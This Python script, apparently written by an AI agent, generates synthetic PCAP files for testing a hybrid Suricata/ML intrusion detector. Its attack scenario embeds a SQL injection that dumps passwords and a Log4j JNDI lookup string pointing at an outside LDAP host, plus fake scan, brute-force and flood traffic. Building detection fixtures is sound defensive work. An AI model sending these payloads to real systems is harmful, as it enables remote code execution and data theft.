#!/usr/bin/env python3
"""
Agent 2: Deterministic PCAP sample generator for Hybrid IDS verification scenarios.
Generates valid standard libpcap (.pcap) binary files with Ethernet + IPv4 + TCP/UDP headers:
  1. samples/attack_signature.pcap       (Scenario A: Known attacks matching Suricata rules + benign background)
  2. samples/suspicious_unmatched_ml.pcap (Scenario B: High-rate volumetric/scan flows with NO signature match -> ML alert)
  3. samples/benign_traffic.pcap          (Scenario C: Clean HTTP/HTTPS/DNS enterprise traffic -> 0 alerts)
"""
import os
import struct
import socket

PCAP_GLOBAL_HEADER = struct.pack(
    "<IHHiIII",
    0xA1B2C3D4,  # magic number (microsecond resolution, little-endian)
    2,           # version major
    4,           # version minor
    0,           # thiszone
    0,           # sigfigs
    65535,       # snaplen
    1,           # network (LINKTYPE_ETHERNET)
)


def build_ipv4_packet(
    src_ip: str,
    dst_ip: str,
    src_port: int,
    dst_port: int,
    proto: int,
    payload: bytes,
    tcp_flags: int = 0x18,  # PSH+ACK default
    seq: int = 1000,
    ack: int = 1000,
) -> bytes:
    eth_header = b"\x00\x11\x22\x33\x44\x55\x66\x77\x88\x99\xaa\xbb\x08\x00"

    if proto == 6:  # TCP
        l4_header = struct.pack(
            "!HHIIBBHHH",
            src_port,
            dst_port,
            seq,
            ack,
            (5 << 4),  # data offset = 20 bytes
            tcp_flags,
            64240,     # window
            0,         # checksum
            0,         # urgent pointer
        )
    else:  # UDP (17)
        udp_len = 8 + len(payload)
        l4_header = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)

    total_ip_len = 20 + len(l4_header) + len(payload)
    ip_header = struct.pack(
        "!BBHHHBBH4s4s",
        0x45,  # Version 4, IHL 5
        0,
        total_ip_len,
        54321,
        0x4000,  # Don't Fragment
        64,      # TTL
        proto,
        0,       # header checksum
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
    )
    return eth_header + ip_header + l4_header + payload


def write_pcap(filepath: str, packets: list[tuple[float, bytes]]) -> None:
    os.makedirs(os.path.dirname(filepath), exist_ok=True)
    with open(filepath, "wb") as f:
        f.write(PCAP_GLOBAL_HEADER)
        for ts, pkt in packets:
            ts_sec = int(ts)
            ts_usec = int((ts - ts_sec) * 1_000_000)
            pkt_len = len(pkt)
            rec_hdr = struct.pack("<IIII", ts_sec, ts_usec, pkt_len, pkt_len)
            f.write(rec_hdr)
            f.write(pkt)


def generate_all_samples(base_dir: str = "samples") -> None:
    base_ts = 1761380000.0

    # -------------------------------------------------------------------------
    # Scenario A: Known Attack PCAP (matches Suricata rules + benign flows)
    # -------------------------------------------------------------------------
    attack_pkts: list[tuple[float, bytes]] = []
    # Flow 1: SQL Injection against 10.0.0.50:80 (SID 2010935, Severity 1)
    sqli_payload = (
        b"GET /login.php?user=admin'%20UNION%20SELECT%201,password%20FROM%20users-- HTTP/1.1\r\n"
        b"Host: 10.0.0.50\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    )
    attack_pkts.append((base_ts + 0.010, build_ipv4_packet("192.168.1.105", "10.0.0.50", 51234, 80, 6, b"", tcp_flags=0x02)))
    attack_pkts.append((base_ts + 0.015, build_ipv4_packet("10.0.0.50", "192.168.1.105", 80, 51234, 6, b"", tcp_flags=0x12)))
    attack_pkts.append((base_ts + 0.020, build_ipv4_packet("192.168.1.105", "10.0.0.50", 51234, 80, 6, sqli_payload, tcp_flags=0x18)))
    attack_pkts.append((base_ts + 0.045, build_ipv4_packet("10.0.0.50", "192.168.1.105", 80, 51234, 6, b"HTTP/1.1 500 Internal Error\r\n\r\n", tcp_flags=0x18)))

    # Flow 2: Log4j JNDI RCE against 10.0.0.50:8080 (SID 2034647, Severity 1)
    jndi_payload = (
        b"POST /api/v1/auth HTTP/1.1\r\nHost: 10.0.0.50:8080\r\n"
        b"X-Api-Version: ${jndi:ldap://198.51.100.44:1389/Basic/Command/Base64}\r\n\r\n"
    )
    attack_pkts.append((base_ts + 1.100, build_ipv4_packet("203.0.113.88", "10.0.0.50", 44120, 8080, 6, b"", tcp_flags=0x02)))
    attack_pkts.append((base_ts + 1.104, build_ipv4_packet("203.0.113.88", "10.0.0.50", 44120, 8080, 6, jndi_payload, tcp_flags=0x18)))
    attack_pkts.append((base_ts + 1.120, build_ipv4_packet("10.0.0.50", "203.0.113.88", 8080, 44120, 6, b"HTTP/1.1 200 OK\r\n\r\n", tcp_flags=0x18)))

    # Flow 3: Nmap Scripting Engine scan from 192.168.1.105 (SID 2024364, Severity 2)
    nmap_payload = (
        b"GET /sdk/vimServiceVersions.xml HTTP/1.1\r\nHost: 10.0.0.50\r\n"
        b"User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\r\n\r\n"
    )
    attack_pkts.append((base_ts + 2.200, build_ipv4_packet("192.168.1.105", "10.0.0.50", 51990, 443, 6, nmap_payload, tcp_flags=0x18)))
    attack_pkts.append((base_ts + 2.210, build_ipv4_packet("10.0.0.50", "192.168.1.105", 443, 51990, 6, b"HTTP/1.1 404 Not Found\r\n\r\n", tcp_flags=0x14)))

    # Flow 4: SSH Brute Force scan against 10.0.0.22:22 (SID 2001219, Severity 2)
    ssh_payload = b"SSH-2.0-OpenSSH_BruteScanner_7.9\r\n"
    for i in range(6):
        attack_pkts.append((base_ts + 3.000 + i * 0.005, build_ipv4_packet("198.51.100.23", "10.0.0.22", 60100, 22, 6, ssh_payload, tcp_flags=0x18)))

    # Flow 5: Benign DNS lookup (should NOT trigger alert)
    dns_payload = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
    attack_pkts.append((base_ts + 4.000, build_ipv4_packet("10.0.0.15", "8.8.8.8", 53111, 53, 17, dns_payload)))
    attack_pkts.append((base_ts + 4.025, build_ipv4_packet("8.8.8.8", "10.0.0.15", 53, 53111, 17, dns_payload + b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x01\x2c\x00\x04\x5d\xb8\xd8\x22")))

    write_pcap(os.path.join(base_dir, "attack_signature.pcap"), attack_pkts)

    # -------------------------------------------------------------------------
    # Scenario B: Unmatched Suspicious Traffic PCAP (0 signatures -> ML Malicious)
    # High packet/byte rate DDoS & SYN flood patterns with NO signature strings
    # -------------------------------------------------------------------------
    ml_pkts: list[tuple[float, bytes]] = []
    # Suspicious Flow 1: High-rate volumetric TCP flood to port 80 (45 packets in 12ms, SYN+RST+PSH burst)
    for i in range(45):
        f1_flags = 0x02 if i < 15 else (0x04 if i < 25 else 0x18)
        f1_payload = b"X" * (920 + (i % 7) * 25)
        ml_pkts.append((
            base_ts + 10.000 + i * 0.00025,
            build_ipv4_packet("172.16.99.41", "10.0.0.50", 49200, 80, 6, f1_payload, tcp_flags=f1_flags, seq=1000 + i * 950)
        ))
    # Suspicious Flow 2: Rapid asymmetric burst to port 443 (38 packets in 9ms, high SYN/RST/PSH ratio)
    opaque_blob_2 = b"Q" * 980
    for i in range(38):
        flag_val = 0x02 if i < 12 else (0x04 if i < 20 else 0x18)
        ml_pkts.append((
            base_ts + 11.500 + i * 0.00022,
            build_ipv4_packet("172.16.99.42", "10.0.0.50", 49811, 443, 6, opaque_blob_2, tcp_flags=flag_val, seq=2000 + i * 980)
        ))
    # Benign Flow in same PCAP: normal slow HTTPS flow (should NOT create alert)
    ml_pkts.append((base_ts + 12.000, build_ipv4_packet("10.0.0.12", "93.184.216.34", 54100, 443, 6, b"\x16\x03\x01\x00\x40" + b"A" * 60, tcp_flags=0x18)))
    ml_pkts.append((base_ts + 12.240, build_ipv4_packet("93.184.216.34", "10.0.0.12", 443, 54100, 6, b"\x16\x03\x03\x00\x50" + b"B" * 76, tcp_flags=0x18)))
    ml_pkts.append((base_ts + 12.550, build_ipv4_packet("10.0.0.12", "93.184.216.34", 54100, 443, 6, b"\x17\x03\x03\x00\x30" + b"C" * 44, tcp_flags=0x10)))
    ml_pkts.append((base_ts + 12.900, build_ipv4_packet("93.184.216.34", "10.0.0.12", 443, 54100, 6, b"\x17\x03\x03\x00\x40" + b"D" * 60, tcp_flags=0x11)))

    write_pcap(os.path.join(base_dir, "suspicious_unmatched_ml.pcap"), ml_pkts)

    # -------------------------------------------------------------------------
    # Scenario C: Benign Enterprise Traffic PCAP (0 alerts expected)
    # -------------------------------------------------------------------------
    benign_pkts: list[tuple[float, bytes]] = []
    # Normal HTTP flow with calm multi-hundred-millisecond pacing and balanced forward/backward traffic
    benign_pkts.append((base_ts + 20.000, build_ipv4_packet("10.0.0.19", "93.184.216.34", 50112, 80, 6, b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n", tcp_flags=0x18)))
    benign_pkts.append((base_ts + 20.320, build_ipv4_packet("93.184.216.34", "10.0.0.19", 80, 50112, 6, b"HTTP/1.1 200 OK\r\nContent-Length: 48\r\n\r\n<html><body>Welcome to Example</body></html>", tcp_flags=0x18)))
    benign_pkts.append((base_ts + 20.750, build_ipv4_packet("10.0.0.19", "93.184.216.34", 50112, 80, 6, b"", tcp_flags=0x11)))
    benign_pkts.append((base_ts + 21.100, build_ipv4_packet("93.184.216.34", "10.0.0.19", 80, 50112, 6, b"", tcp_flags=0x11)))

    # Normal DNS query flow
    benign_pkts.append((base_ts + 22.000, build_ipv4_packet("10.0.0.14", "1.1.1.1", 55201, 53, 17, dns_payload)))
    benign_pkts.append((base_ts + 22.180, build_ipv4_packet("1.1.1.1", "10.0.0.14", 53, 55201, 17, dns_payload + b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x01\x2c\x00\x04\x01\x01\x01\x01")))

    # Normal HTTPS session
    benign_pkts.append((base_ts + 24.000, build_ipv4_packet("10.0.0.21", "151.101.1.69", 56002, 443, 6, b"\x16\x03\x01\x00\x38" + b"H" * 52, tcp_flags=0x18)))
    benign_pkts.append((base_ts + 24.380, build_ipv4_packet("151.101.1.69", "10.0.0.21", 443, 56002, 6, b"\x16\x03\x03\x00\x64" + b"S" * 96, tcp_flags=0x18)))
    benign_pkts.append((base_ts + 24.850, build_ipv4_packet("10.0.0.21", "151.101.1.69", 56002, 443, 6, b"", tcp_flags=0x11)))

    write_pcap(os.path.join(base_dir, "benign_traffic.pcap"), benign_pkts)
    print("Generated samples/attack_signature.pcap, samples/suspicious_unmatched_ml.pcap, samples/benign_traffic.pcap")


if __name__ == "__main__":
    generate_all_samples()
